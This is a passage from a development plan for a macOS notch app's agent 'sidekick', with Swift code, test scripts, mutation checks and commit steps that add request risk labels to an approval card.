                notes.offer(SKNote(id: take(), kind: n.kind, text: SidekickStuck.text(n, ledger, now: now, platform: env.platform), key: n.key, agentId: n.agentId, createdAt: now), now: now)
            }
        }
        // A nudge that is no longer true goes, and the waiting nudge's words change in place at the app's give-up time (it is not a second nudge).
        for n in notes.queue + (showing.map { [$0] } ?? []) where !n.isRecap {
            if stale(n) { if showing?.id == n.id { retireShowing() } else { notes.drop(n.id) }; continue }
            if n.kind == "stuck.waiting", let nu = nudge(of: n) { notes.retext(kind: n.kind, key: n.key, text: SidekickStuck.text(nu, ledger, now: now, platform: env.platform)); if showing?.id == n.id { showing = notes.showing?.note } }
        }
        // The first held note the gate lets through shows. A note that can never show (the switch is off, its kind is muted, its period has had its recap) is dropped now.
        for n in notes.queue {
            let d = SidekickGate.shouldShow(input(for: n, now: now))
            if ["off", "kind", "muted", "recapGiven"].contains(d.reason) { notes.drop(n.id); continue }
            guard d.show, env.canHost() else { continue }
            if d.replace { retireShowing() }
            guard let shown = notes.show(n.id, now: now) else { continue }
            showing = shown
            if !shown.isRecap, let key = shown.key { ledger = SidekickStuck.markNudged(ledger, key: key, now: now) }   // given: it has been shown
            env.present(shown)
            if shown.isRecap, store.settings.local { polish(shown) }
            break
        }
    }

    /// A nicer sentence for a recap, if a local model has one in time: it replaces the words once, and only if the pointer is not on the note.
    private func polish(_ note: SKNote) {
        polishTask = Task { @MainActor [weak self] in
            guard let self, let nicer = await self.env.polish(note) else { return }
            guard self.showing?.id == note.id, !self.env.pointerOver() else { return }
            self.notes.retext(kind: note.kind, key: note.key, text: nicer)
            self.showing = self.notes.showing?.note
        }
    }

    /// The nearest time something must be looked at again: a stuck rule falls due, a held note runs out, or the note on screen has had its time. nil when nothing runs (the clock is then not set).
    private func deadline() -> Double? {
        let now = env.now()
        let stuck = store.settings.on ? SidekickStuck.step(ledger, now: now, ctx: SKStuckContext(ratelimit: env.ratelimited(), away: presence.isAway, cardShown: env.ownCardShown(), platform: env.platform)).nextAt : nil
        // A waiting nudge that is held or on screen changes its words when the app gives up on the request.
        let giveUp = (notes.queue + (showing.map { [$0] } ?? [])).compactMap { n -> Double? in
            guard n.kind == "stuck.waiting", let key = n.key, let at = ledger.sessions.first(where: { $0.key == key })?.pendingApprovalAt else { return nil }
            let due = at + (SidekickStuck.giveUpMs[env.platform] ?? SidekickStuck.giveUpMs["mac"]!)
            return due > now ? due : nil
        }.min()
        return SidekickNotes.nearest(SidekickNotes.nearest(stuck, notes.nextDeadline), giveUp)
    }
}
```

- [ ] **Step 4: Run the test to make it pass**

Run: `bash scripts/test-sidekick-engine.sh`
Expected: PASS. Eleven headings, 64 `✓` lines, then `All tests passed.`

Bite it once, three ways (undo each before the next): (a) the nudge is not marked as given when it shows, `sed -i '' 's/ledger = SidekickStuck.markNudged(ledger, key: key, now: now) }/_ = key }/' NotchBuddy/Sources/App/SidekickEngine.swift` fails `✗ it was shown, so the session has had its nudge: the loop going on makes no second` (`1 test(s) failed.`); (b) the clock is set when nothing runs, `sed -i '' 's/clock.set(deadline())/clock.set(env.now() + 60000)/' NotchBuddy/Sources/App/SidekickEngine.swift` fails twelve checks, among them `✗ and the clock has nothing to wait for…`, `✗ and the clock is idle again`, `✗ and no deadline is waited for` and `✗ the session ends: the note about it goes (stale), and no timer is left` (`12 test(s) failed.`); (c) the gate lets a muted kind through, `sed -i '' 's/>= SidekickSettings.muteAt { return no("muted") }/>= 99 { return no("muted") }/' NotchBuddy/Sources/App/SidekickPresence.swift` fails `✗ a muted recap never shows` and `✗ Unmute: the next return shows it again` (`2 test(s) failed.`). Undo each with the reverse `sed` (for (a): `_ = key }` back to `ledger = SidekickStuck.markNudged(ledger, key: key, now: now) }`; for (c): `>= 99 { return no("muted") }` back to `>= SidekickSettings.muteAt { return no("muted") }`), and finish with `All tests passed.`

- [ ] **Step 5: Commit**

```bash
cd NotchBuddy && xcodegen > /dev/null && cd ..
```

```bash
git rev-parse --show-toplevel && git branch --show-current   # the worktree's folder and f1/mac-sidekick: stop if either is wrong
MSG="$(mktemp "${TMPDIR:-/tmp}/f1-mac-msg.XXXXXX")"
cat > "$MSG" <<'EOF'
feat(sidekick): the engine, driven by hand: recap, nudges, held notes, mute and the one clock

Everything the app knows reaches it through closures, so scripted runs prove the flow without launching anything; no agent, no timer.

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
EOF
git add NotchBuddy/Sources/App/SidekickEngine.swift tests/SidekickEngineTests.swift scripts/test-sidekick-engine.sh NotchBuddy/NotchBuddy.xcodeproj/project.pbxproj
git commit -F "$MSG"
```

---

### Task 10: The app's sidekick, and the feed point in the hook server

**Agent:** `nm-implementer-deep` (**Sonnet 5.5, high: CLAUDE.md trigger 1**, the hook handler's order of events and the main-actor isolation of the one-shot timer).

**Files:**
- Create: `NotchBuddy/Sources/App/Sidekick.swift`, `tests/SidekickWiringTests.swift`, `scripts/test-sidekick-wiring.sh`
- Modify: `NotchBuddy/Sources/App/HookServer.swift`, `NotchBuddy/NotchBuddy.xcodeproj/project.pbxproj` (regenerated by `xcodegen`)

**Interfaces:**
- Consumes: Task 9's `SidekickEngine` and its `Env`, Task 5's `SidekickStore.shared`, Task 7's `SidekickClock`; `AppState.shared` (`chatApproval`, `pendingApproval`, `pendingQuestion`, `mode`, `view`, `tasks`), `HookServer`'s three handlers.
- Produces: `Sidekick` (`shared`, `nowMs()`, `codexEnabled`, `engine`, `feed(payload:)`, `approvalAnswered(agentId:sessionId:)`, `liveAgents`); the three feed calls in `HookServer`; the wiring test, which the later tasks extend.

`Sidekick.marker` (`NM_SIDEKICK_ENGINE_PRESENT`) lives in this file; Task 13's note view uses it as its accessibility identifier so a Release build cannot drop it as unused (Task 19's binary check looks for it).

`Sidekick` is the thin app side of the engine: the app's own clock (**wall time**, so the minutes a Mac spent asleep count as time away), the app's one one-shot timer (`DispatchQueue.main.asyncAfter(wallDeadline:)`, cancelled and replaced by `SidekickClock.set`, never repeating), and the two things the gate asks of the app (is a card in front of the island, is the approval card on screen). `HookServer` feeds it at the **top of each handler, before the pending-approval gate**, so a request that is displaced or declined is still counted: `processEvent` (before `touchPill`, after a chat's own run was filtered out and the route was decided), `processPermissionRequest` (after a tagged agent's request and a question that arrives as a permission request were answered `ask`, before the previous request is displaced) and `processQuestionRequest`; and `sendApprovalDecision` tells it about the user's click, the one event that is not a hook. It never answers a request: nothing it has can write to a socket.

- [ ] **Step 1: Write the failing test**

The wiring test reads the sources as text (no test program can compile `HookServer`, which needs the whole app) and pins the feed point: three feeds, each before what could drop the event, one answer per click, and that the sidekick's files answer nothing, write no socket, log nothing, start no repeating timer, read no transcript and no file of the agent, and keep the ledger in memory.

**Create `tests/SidekickWiringTests.swift`**

```swift
import Foundation

// Source pins for the sidekick, where no test program can compile the app's files (they need the whole app). Each says where a pure rule must be called, and that what the sidekick promises is
// not undone by a later edit: it reads events before the pending-approval gate, it never answers a request, it starts no timer of its own, and it logs nothing. Run from the repository root
// through scripts/test-sidekick-wiring.sh.

@main
enum SidekickWiringTests {
    static func source(_ file: String) -> String { (try? String(contentsOfFile: "NotchBuddy/Sources/App/\(file)", encoding: .utf8)) ?? "" }
    static func count(_ needle: String, in text: String) -> Int { text.components(separatedBy: needle).count - 1 }
    /// The offset of the first `needle`, or -1.
    static func at(_ needle: String, in text: String) -> Int { text.range(of: needle)?.lowerBound.utf16Offset(in: text) ?? -1 }
    /// The offset of the first `needle` at or after `from`, or -1.
    static func at(_ needle: String, in text: String, from: Int) -> Int { from < 0 ? -1 : text.range(of: needle, range: String.Index(utf16Offset: from, in: text)..<text.endIndex)?.lowerBound.utf16Offset(in: text) ?? -1 }

    @MainActor static func main() {
        let hooks = source("HookServer.swift"), center = source("Sidekick.swift")
        CT.section("the sources were read")
        CT.checkTrue("the files are there", hooks.contains("final class HookServer") && center.contains("final class Sidekick"))

        CT.section("the ledger is fed at the top of each handler, before the pending-approval gate")
        CT.check("an event, a permission request and a question each feed it, once", count("Sidekick.shared.feed(payload: payload)", in: hooks), 3)
        let gate = at("if let pending = state.pendingApproval, agentId == pending.pillId {", in: hooks)
        CT.checkTrue("an event is fed before the gate can drop it", at("Sidekick.shared.feed(payload: payload)", in: hooks) > 0 && at("Sidekick.shared.feed(payload: payload)", in: hooks) < gate)
        let permission = at("private func processPermissionRequest", in: hooks)
        let displaced = at("// Displace the previous request", in: hooks, from: permission)
        let permFeed = at("Sidekick.shared.feed(payload: payload)", in: hooks, from: permission)
        CT.checkTrue("a permission request is fed before the previous request is displaced", permFeed > permission && permFeed < displaced)
        CT.checkTrue("a chat's own run is filtered out before the feed, as it is before everything else", at("ClaudeHookRouting.route(payload: payload, live: ClaudeService.shared.liveClaudeSessions)", in: hooks) < at("Sidekick.shared.feed(payload: payload)", in: hooks))
        CT.checkTrue("a stray request from a tagged agent, and a question that arrives as a permission request, are answered ask at once and never fed", permFeed > at("if tool == \"AskUserQuestion\" {", in: hooks, from: permission) && permFeed > at("if case .external = route {", in: hooks, from: permission))
        CT.checkTrue("the user's click is the one event the app makes, with the pill and the session of the card", hooks.contains("Sidekick.shared.approvalAnswered(agentId: asked.pillId, sessionId: asked.sessionId)") && count("approvalAnswered(", in: hooks) == 1)

        CT.section("the sidekick only reads: it answers nothing, starts no timer of its own and logs nothing")
        let files = ["Sidekick.swift", "SidekickStore.swift"]
        for f in files {
            let t = source(f)
            CT.checkTrue("\(f): no hook answer, no socket, no log, no print", !t.contains("sendApprovalDecision") && !t.contains("sendLine") && !t.contains("permissionDecision") && !t.contains("appendAppLog") && !t.contains("nbLog") && !t.contains("print(") && !t.contains("NSLog") && !t.contains("Logger"))
            CT.checkTrue("\(f): no repeating timer, no poll", !t.contains("Timer") && !t.contains("repeats") && !t.contains("makeTimerSource"))
            CT.checkTrue("\(f): it never reads a transcript or a file of the agent", !t.contains("transcript_path") && !t.contains(".claude") && !t.contains("contentsOfFile") && !t.contains("FileManager"))
        }
        CT.check("the ledger is memory only: nothing writes it", [count("UserDefaults", in: center), count("write(", in: center), count("JSONSerialization", in: center)], [0, 0, 0])
        CT.finish()
    }
}
```

**Create `scripts/test-sidekick-wiring.sh`**

```bash
#!/usr/bin/env bash
# Sidekick wiring: where HookServer, the approval card, the island, the chat, the drop and the settings call the sidekick's pure rules, pinned as source text.
set -euo pipefail
cd "$(dirname "$0")/.."
TEST_DIR="$(mktemp -d "${TMPDIR:-/tmp}/notchmeow-sidekick-wiring.XXXXXX")"
trap 'rm -rf "$TEST_DIR"' EXIT
export NM_LOG_DIR="$TEST_DIR/logs"   # tests never write to ~/Library/Logs

swiftc -swift-version 6 \
    tests/CatTestSupport.swift tests/SidekickWiringTests.swift \
    -o "$TEST_DIR/sidekick-wiring-tests"
"$TEST_DIR/sidekick-wiring-tests"
```

Then make it executable: `chmod +x scripts/test-sidekick-wiring.sh`

- [ ] **Step 2: Run the test to make it fail**

Run: `bash scripts/test-sidekick-wiring.sh`
Expected: FAIL. The file check `✓ the files are there` fails (there is no `final class Sidekick` yet) and so do the pins on the feed calls, ending `N test(s) failed.`.

- [ ] **Step 3: Write the app's sidekick**

**Create `NotchBuddy/Sources/App/Sidekick.swift`**

```swift
import Combine
import Foundation

// The agent sidekick (sub-project F1) in the app: the one `SidekickEngine` with the app's own clock, one-shot timer and settings, and the few things it asks the app (what is in front of the island, whether an
// agent is rate-limited). It reads the hook events the app already receives, never sends anything and never decides anything: a request is answered only by the user's click. `HookServer` feeds it at the top
// of each handler, BEFORE the pending-approval gate, so a request that is displaced or declined is still counted. The rules are pure files (`Sidekick*.swift`) tested against tests/fixtures/sidekick/ and the
// engine is tested with a clock and a timer by hand (tests/SidekickEngineTests.swift); this file is the thin app side, and tests/SidekickWiringTests.swift pins where it is called from.
// Its memory is the ledger: a basename, a command key and counts per session, in memory only, never written to disk, never logged. It starts no timer of its own: the engine's ONE one-shot clock is set only
// while something is waiting for a deadline (`SidekickClock`).

@MainActor
final class Sidekick {
    static let shared = Sidekick()

    /// The sidekick's clock, in ms: wall time, so the minutes a Mac spent asleep count as time away.
    static func nowMs() -> Double { Date().timeIntervalSince1970 * 1000 }

    /// In the binary of every build (Debug, Release and App Store): `scripts/check-app-binary.sh` looks for it. It is longer than 15 bytes on purpose (Swift keeps a shorter string inside the code, where
    /// `strings` cannot see it), and the note's view uses it as its accessibility identifier, so a Release build cannot drop it as unused.
    static let marker = "NM_SIDEKICK_ENGINE_PRESENT"

    #if APPSTORE
    static let codexEnabled = false
    #else
    static let codexEnabled = true
    #endif

    let engine: SidekickEngine
    private var cancellables = Set<AnyCancellable>()

    private init() {
        // One one-shot timer on the main queue, on the wall clock (it keeps counting while the Mac sleeps). `SidekickClock.set` is the only caller, and sets it only while a deadline is waiting.
        let clock = SidekickClock(now: { Sidekick.nowMs() }, schedule: { afterMs, fire in
            let item = DispatchWorkItem { MainActor.assumeIsolated { fire() } }
            DispatchQueue.main.asyncAfter(wallDeadline: .now() + afterMs / 1000, execute: item)
            return { item.cancel() }
        })
        var env = SidekickEngine.Env(now: { Sidekick.nowMs() })
        env.cardInFront = {
            let app = AppState.shared
            #if !APPSTORE
            if app.chatApproval != nil { return "approval" }
            #endif
            return app.pendingApproval != nil ? "approval" : app.pendingQuestion != nil ? "question" : nil
        }
        env.ownCardShown = { let app = AppState.shared; return app.pendingApproval != nil && app.mode == .expanded && app.view == .approval }
        env.ratelimited = { AppState.shared.tasks.contains { $0.state == .ratelimit } }
        engine = SidekickEngine(store: .shared, clock: clock, env: env, codex: Self.codexEnabled)
        // A change of a setting (the switch, Unmute) decides again what may show.
        SidekickStore.shared.$settings.dropFirst().sink { [weak self] _ in MainActor.assumeIsolated { self?.engine.envChanged() } }.store(in: &cancellables)
    }

    /// A hook payload at the feed point (`HookServer.processEvent`, `processPermissionRequest` and `processQuestionRequest`). An event the ledger does not know is nothing.
    func feed(payload: [String: Any]) { engine.feed(payload: payload) }

    /// The user answered an approval card (Deny, Allow or Always): the one event that is not a hook.
    func approvalAnswered(agentId: String, sessionId: String) { engine.approvalAnswered(agentId: agentId, sessionId: sessionId) }

    /// The agents that have a live session (one that has not ended): the pills a drop may hand a path to.
    var liveAgents: Set<String> { engine.liveAgents }
}
```

- [ ] **Step 4: Feed the ledger from the hook server**

**Edit `NotchBuddy/Sources/App/HookServer.swift`** (the find text occurs exactly once)

Find:

```swift
        if case .external = route { isExternalAgent = true } else { isExternalAgent = false }

        state.touchPill(agentId)   // the pill's last event: Two cats mode's busiest-other rule reads it
        // Which app a terminal session runs in, so the pill's tap brings that app forward (nil for VS Code, whose route is its own).
```

Replace with:

```swift
        if case .external = route { isExternalAgent = true } else { isExternalAgent = false }

        // The sidekick reads every event before the pending-approval gate below, so a request that is displaced or declined is still counted (it never answers one).
        Sidekick.shared.feed(payload: payload)
        state.touchPill(agentId)   // the pill's last event: Two cats mode's busiest-other rule reads it
        // Which app a terminal session runs in, so the pill's tap brings that app forward (nil for VS Code, whose route is its own).
```

**Edit `NotchBuddy/Sources/App/HookServer.swift`** (the find text occurs exactly once)

Find:

```swift
        }

        let command = toolInput["command"] as? String ?? tool

```

Replace with:

```swift
        }

        Sidekick.shared.feed(payload: payload)   // before the previous request is displaced
        let command = toolInput["command"] as? String ?? tool

```

**Edit `NotchBuddy/Sources/App/HookServer.swift`** (the find text occurs exactly once)

Find:

```swift
        }

        let state = AppState.shared
        let pillId = state.pendingApproval?.pillId ?? "integration_claude"
        resolveApprovalKitten(state.pendingApproval)
        state.pendingApproval = nil
        state.isPinned = false
        let shown = state.releasePill(id: pillId, fallback: .working)   // the latest state another session asked while the card was up, else working
```

Replace with:

```swift
        }

        let state = AppState.shared
        let pillId = state.pendingApproval?.pillId ?? "integration_claude"
        if let asked = state.pendingApproval { Sidekick.shared.approvalAnswered(agentId: asked.pillId, sessionId: asked.sessionId) }   // the user's click, for the ledger
        resolveApprovalKitten(state.pendingApproval)
        state.pendingApproval = nil
        state.isPinned = false
        let shown = state.releasePill(id: pillId, fallback: .working)   // the latest state another session asked while the card was up, else working
```

**Edit `NotchBuddy/Sources/App/HookServer.swift`** (the find text occurs exactly once)

Find:

```swift
        let pillId = HookOrigin.pillId(route)

        state.touchPill(pillId)
        // Displace any previous question waiting for an answer.
```

Replace with:

```swift
        let pillId = HookOrigin.pillId(route)

        Sidekick.shared.feed(payload: payload)
        state.touchPill(pillId)
        // Displace any previous question waiting for an answer.
```

- [ ] **Step 5: Run the test, the neighbours' tests and the build**

Run: `bash scripts/test-sidekick-wiring.sh`
Expected: PASS: `All tests passed.` (the pins of this stage, each a `✓`).

Run: `for s in test-sidekick-engine test-hook-origin test-hook-origin-wiring test-cat-wiring test-cat-kitten-hooks test-fake-terminal-events; do printf '%-34s' $s; bash scripts/$s.sh 2>&1 | tail -1; done`
Expected: six lines, each ending `All tests passed.` (the hook server's own pins, which count the routing calls and the order around the gate, are unchanged by three added lines).

```bash
cd NotchBuddy && xcodegen > /dev/null && cd .. && xcodebuild -project NotchBuddy/NotchBuddy.xcodeproj -scheme NotchBuddy -configuration Debug -derivedDataPath NotchBuddy/build build CODE_SIGNING_ALLOWED=NO 2>&1 | tail -3
```

Expected: `** BUILD SUCCEEDED **`.

- [ ] **Step 6: Commit**

```bash
git rev-parse --show-toplevel && git branch --show-current   # the worktree's folder and f1/mac-sidekick: stop if either is wrong
MSG="$(mktemp "${TMPDIR:-/tmp}/f1-mac-msg.XXXXXX")"
cat > "$MSG" <<'EOF'
feat(sidekick): the app's sidekick, fed at the top of each hook handler before the approval gate

Sidekick holds the engine with the app's wall clock, one one-shot timer and the two things the gate asks of the island; HookServer feeds it before a request can be displaced or declined, and tells it of the user's click. It answers nothing.

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
EOF
git add NotchBuddy/Sources/App/Sidekick.swift NotchBuddy/Sources/App/HookServer.swift tests/SidekickWiringTests.swift scripts/test-sidekick-wiring.sh NotchBuddy/NotchBuddy.xcodeproj/project.pbxproj
git commit -F "$MSG"
```

---

### Task 11: The permission line, the badge and the surprised emote

**Agent:** `nm-implementer` (Haiku 5.5, high). Edits to four shipping files; the card's look is checked on a picture.

**Files:**
- Modify: `NotchBuddy/Sources/App/IslandTypes.swift` (`ApprovalInfo`), `NotchBuddy/Sources/App/HookServer.swift`, `NotchBuddy/Sources/App/IslandViewContent.swift` (`ApprovalView`, `RiskBadge`), `NotchBuddy/Sources/App/Sidekick.swift` (`realHome`), `scripts/render-approval-card.swift`, `scripts/render-approval-card.sh`, `tests/SidekickWiringTests.swift`, `tests/HookOriginWiringTests.swift` (one pin follows the new argument list)

**Interfaces:**
- Consumes: Task 1's `SidekickExplain.explain`, Task 10's `Sidekick`; `ApprovalInfo` (`sessionId`, `tool`, `command`, `inputKey`, `pillId`, `subagentId`, `host`), `AppState.desktopPhase.notchEmpty`, `BotEmote.surprised`, `Notification.Name.triggerEmote`.
- Produces: `ApprovalInfo.target`, `.risk` and `.line` (all `String`, default `""`, so every other caller is as it was), `Sidekick.realHome`, `RiskBadge`.

**Only two things are added to the card, and only when the request has been explained.** One grey line (11 pt, `#8E939C`, one line, `lineLimit(1)`) between the command and the buttons: a fixed sentence with a basename in it (`Deletes build and everything inside it.`), never the command's own words. And a small orange `High risk` capsule at the trailing edge of the first row, on high-risk requests only (medium and low show the line alone, and the badge is never muted). On a high-risk request the cat gives its **existing** `surprised` emote once; no new emote is added, and not while the desktop cat is out (its flight to the notch already starts with that surprise). Deny, Allow and Always, the 120 s limit, "never approve without a click" and the Codex rule that hides Always are untouched: the badge is not a button and nothing in the sidekick can answer. A request the rules do not know still shows the card as today, with the `unknown_tool` line. The user's real home folder (for `~` and `$HOME` in a command) comes from `getpwuid`, because in the App Store build `NSHomeDirectory()` is the sandbox's container. **The card is a fixed 160 pt**, so this task ends with `scripts/render-approval-card.sh` drawing it with the line and the badge: if the third row does not fit, stop and report (do not shrink anything).

- [ ] **Step 1: Write the failing pins**

**Edit `tests/SidekickWiringTests.swift`** (the find text occurs exactly once)

Find:

```swift

    @MainActor static func main() {
        let hooks = source("HookServer.swift"), center = source("Sidekick.swift")
        CT.section("the sources were read")
        CT.checkTrue("the files are there", hooks.contains("final class HookServer") && center.contains("final class Sidekick"))

        CT.section("the ledger is fed at the top of each handler, before the pending-approval gate")
```

Replace with:

```swift

    @MainActor static func main() {
        let hooks = source("HookServer.swift"), center = source("Sidekick.swift"), types = source("IslandTypes.swift"), view = source("IslandViewContent.swift")
        CT.section("the sources were read")
        CT.checkTrue("the files are there", hooks.contains("final class HookServer") && center.contains("final class Sidekick") && types.contains("struct ApprovalInfo") && view.contains("struct ApprovalView"))

        CT.section("the ledger is fed at the top of each handler, before the pending-approval gate")
```

**Edit `tests/SidekickWiringTests.swift`** (the find text occurs exactly once)

Find:

```swift
        CT.checkTrue("a stray request from a tagged agent, and a question that arrives as a permission request, are answered ask at once and never fed", permFeed > at("if tool == \"AskUserQuestion\" {", in: hooks, from: permission) && permFeed > at("if case .external = route {", in: hooks, from: permission))
        CT.checkTrue("the user's click is the one event the app makes, with the pill and the session of the card", hooks.contains("Sidekick.shared.approvalAnswered(agentId: asked.pillId, sessionId: asked.sessionId)") && count("approvalAnswered(", in: hooks) == 1)

        CT.section("the sidekick only reads: it answers nothing, starts no timer of its own and logs nothing")
```

Replace with:

```swift
        CT.checkTrue("a stray request from a tagged agent, and a question that arrives as a permission request, are answered ask at once and never fed", permFeed > at("if tool == \"AskUserQuestion\" {", in: hooks, from: permission) && permFeed > at("if case .external = route {", in: hooks, from: permission))
        CT.checkTrue("the user's click is the one event the app makes, with the pill and the session of the card", hooks.contains("Sidekick.shared.approvalAnswered(agentId: asked.pillId, sessionId: asked.sessionId)") && count("approvalAnswered(", in: hooks) == 1)

        CT.section("the approval card: one grey line and a High risk badge, and nothing else changes")
        CT.checkTrue("the card's data grows by the three fields, with defaults so every other caller is as it was", types.contains("var target: String = \"\"") && types.contains("var risk: String = \"\"") && types.contains("var line: String = \"\""))
        CT.checkTrue("the request is explained once, with the user's real home, in the permission handler", count("SidekickExplain.explain(agent: pillId, tool: tool, input: toolInput, cwd: cwd, home: Sidekick.realHome)", in: hooks) == 1 && at("SidekickExplain.explain(", in: hooks) > permission)
        CT.checkTrue("the card is built with what it says", hooks.contains("target: why.target, risk: why.risk, line: why.line)"))
        CT.checkTrue("the cat gives the existing surprised emote once, on high risk only, and not while the desktop cat is out", hooks.contains("if why.risk == \"high\", !state.desktopPhase.notchEmpty { NotificationCenter.default.post(name: .triggerEmote, object: BotEmote.surprised) }") && count("BotEmote.surprised", in: hooks) == 1)
        let card = at("struct ApprovalView: View {", in: view), cardEnd = at("// MARK: - Question", in: view, from: card)
        let cardText = card > 0 && cardEnd > card ? String(view.utf16[view.utf16.index(view.utf16.startIndex, offsetBy: card)..<view.utf16.index(view.utf16.startIndex, offsetBy: cardEnd)])! : ""
        CT.checkTrue("the grey line is 11 pt, #8E939C, one line, between the command and the buttons", cardText.contains("Text(line).font(.system(size: 11)).foregroundColor(Color(hex: \"#8E939C\")).lineLimit(1)") && at("CodeBlock(", in: cardText) < at("Text(line)", in: cardText) && at("Text(line)", in: cardText) < at("SecondaryButton(\"Deny\")", in: cardText))
        CT.checkTrue("the badge is on high risk only", cardText.contains("if approval?.risk == \"high\" { RiskBadge() }") && count("RiskBadge()", in: cardText) == 1)
        CT.checkTrue("Deny, Allow and Always are as they were, and Codex still has no Always", cardText.contains("SecondaryButton(\"Deny\")") && cardText.contains("PrimaryButton(\"Allow\")") && cardText.contains("SecondaryButton(\"Always\")") && cardText.contains("if approval?.pillId != \"agent_codex\" {"))
        CT.checkTrue("the badge is not a button: nothing in the sidekick answers a request", !source("Sidekick.swift").contains("sendApprovalDecision") && source("IslandViewContent.swift").contains("struct RiskBadge: View") && !cardText.contains("Button(action") )

        CT.section("the sidekick only reads: it answers nothing, starts no timer of its own and logs nothing")
```

- [ ] **Step 2: Run the pins to make them fail**

Run: `bash scripts/test-sidekick-wiring.sh 2>&1 | grep -E "✗|failed"`
Expected: FAIL: `✗` on the data, the explain call, the card built with what it says, the emote, the grey line, the badge, the buttons and the badge-is-not-a-button pins, ending `N test(s) failed.`.

- [ ] **Step 3: Grow the card's data, explain the request, give the cat its emote**

**Edit `NotchBuddy/Sources/App/IslandTypes.swift`** (the find text occurs exactly once)

Find:

```swift
    /// Where the user is, for the notes "Handled in …" and "Still waiting in …" (`HookOrigin.hostName`).
    var host: String = "VS Code"
}

```

Replace with:

```swift
    /// Where the user is, for the notes "Handled in …" and "Still waiting in …" (`HookOrigin.hostName`).
    var host: String = "VS Code"
    /// What the sidekick says about the request (`SidekickExplain`): the basename it names (or ""), how risky it is ("low", "medium" or "high"; "" while it has not been explained) and one
    /// fixed grey line under the command. It labels only: the card's buttons are the only way to answer.
    var target: String = ""
    var risk: String = ""
    var line: String = ""
}

```

**Edit `NotchBuddy/Sources/App/HookServer.swift`** (the find text occurs exactly once)

Find:

```swift
        let askedBy = CatKittenHooks.subagentId(payload)
        if let kitten = CatKittenHooks.permission(payload: payload, now: CACurrentMediaTime() * 1000) { state.kittenEvent(pillId, kitten) }
        state.pendingApproval = ApprovalInfo(sessionId: sessionId, tool: tool,
                                              command: command, inputKey: inputKey, pillId: pillId, subagentId: askedBy, host: host)
        state.isPinned = true
        SoundEngine.shared.play("approval")
```

Replace with:

```swift
        let askedBy = CatKittenHooks.subagentId(payload)
        if let kitten = CatKittenHooks.permission(payload: payload, now: CACurrentMediaTime() * 1000) { state.kittenEvent(pillId, kitten) }
        // The sidekick explains the request in one line and labels how risky it is. It labels only: nothing it says allows or denies anything.
        let why = SidekickExplain.explain(agent: pillId, tool: tool, input: toolInput, cwd: cwd, home: Sidekick.realHome)
        state.pendingApproval = ApprovalInfo(sessionId: sessionId, tool: tool,
                                              command: command, inputKey: inputKey, pillId: pillId, subagentId: askedBy, host: host,
                                              target: why.target, risk: why.risk, line: why.line)
        state.isPinned = true
        SoundEngine.shared.play("approval")
```

**Edit `NotchBuddy/Sources/App/HookServer.swift`** (the find text occurs exactly once)

Find:

```swift
        withAnimation(.spring(response: 0.5, dampingFraction: 0.72)) { state.focusId = pillId }
        expandIfNeeded(to: .approval)

        // Monitor fd: if the editor closes the connection (handled externally), dismiss the card.
```

Replace with:

```swift
        withAnimation(.spring(response: 0.5, dampingFraction: 0.72)) { state.focusId = pillId }
        expandIfNeeded(to: .approval)
        // A high-risk request makes the cat jump once, with the emote it already has. Not while the desktop cat is out: its own flight to the notch starts with the same surprise.
        if why.risk == "high", !state.desktopPhase.notchEmpty { NotificationCenter.default.post(name: .triggerEmote, object: BotEmote.surprised) }

        // Monitor fd: if the editor closes the connection (handled externally), dismiss the card.
```

**Edit `NotchBuddy/Sources/App/Sidekick.swift`** (the find text occurs exactly once)

Find:

```swift
    static let codexEnabled = true
    #endif

    let engine: SidekickEngine
```

Replace with:

```swift
    static let codexEnabled = true
    #endif

    /// The user's real home folder, for the risk rules (`~` and `$HOME` in a command): the sandbox's container home would be the wrong one in the App Store build.
    static let realHome: String = getpwuid(getuid()).flatMap { String(validatingCString: $0.pointee.pw_dir) } ?? NSHomeDirectory()

    let engine: SidekickEngine
```

- [ ] **Step 4: Draw the line and the badge**

**Edit `NotchBuddy/Sources/App/IslandViewContent.swift`** (the find text occurs exactly once)

Find:

```swift
            CardBackground(wash: .amber)
            VStack(alignment: .leading, spacing: 5) {
                AgentWho(task: state.focusTask, label: "needs permission")
                CodeBlock(text: approval?.command ?? approval?.tool ?? "…")
                HStack(spacing: 8) {
                    SecondaryButton("Deny") {
```

Replace with:

```swift
            CardBackground(wash: .amber)
            VStack(alignment: .leading, spacing: 5) {
                HStack(spacing: 6) {
                    AgentWho(task: state.focusTask, label: "needs permission")
                    Spacer(minLength: 6)
                    if approval?.risk == "high" { RiskBadge() }
                }
                CodeBlock(text: approval?.command ?? approval?.tool ?? "…")
                // The sidekick's one line about the request: a fixed sentence with a basename in it, never the command's own words.
                if let line = approval?.line, !line.isEmpty {
                    Text(line).font(.system(size: 11)).foregroundColor(Color(hex: "#8E939C")).lineLimit(1)
                }
                HStack(spacing: 8) {
                    SecondaryButton("Deny") {
```

**Edit `NotchBuddy/Sources/App/IslandViewContent.swift`** (the find text occurs exactly once)

Find:

```swift
}

struct CodeBlock: View {
    let text: String
```

Replace with:

```swift
}

/// The small orange capsule at the end of the approval card's first row, on high-risk requests only.
struct RiskBadge: View {
    var body: some View {
        Text("High risk")
            .font(.system(size: 10, weight: .semibold))
            .foregroundColor(Color(hex: "#F5A524"))
            .padding(.horizontal, 7).padding(.vertical, 2)
            .background(Color(hex: "#F5A524").opacity(0.16))
            .overlay(Capsule().stroke(Color(hex: "#F5A524").opacity(0.45), lineWidth: 0.5))
            .clipShape(Capsule())
    }
}

struct CodeBlock: View {
    let text: String
```

- [ ] **Step 5: Let the render script draw them, and follow the new argument list in one existing pin**

`render-approval-card.swift` gains `--line` and `--risk` (the picture of the card is how the 160 pt is checked), and `HookOriginWiringTests` pinned the text `host: host)` that ended the card's constructor: it now ends `host: host,` and the new arguments follow.

**Edit `scripts/render-approval-card.swift`** (the find text occurs exactly once)

Find:

```swift
// the app's own AppState with a made-up Claude Code request in it, and the big cat is drawn beside it with the real renderer, in the place the island puts it (`botPosition`). The
// island is a mock around them: a black shape of the expanded size (`islandSize`) with the card where IslandContentView puts it (10 pt in, 42 pt down, 98 pt high), and no header.
//   bash scripts/render-approval-card.sh --out approval-card.png [--scale 2] [--command "npm test"]
// Run it through the .sh: it compiles the whole app but NotchBuddyApp.swift, and runs in a home folder of its own.

```

Replace with:

```swift
// the app's own AppState with a made-up Claude Code request in it, and the big cat is drawn beside it with the real renderer, in the place the island puts it (`botPosition`). The
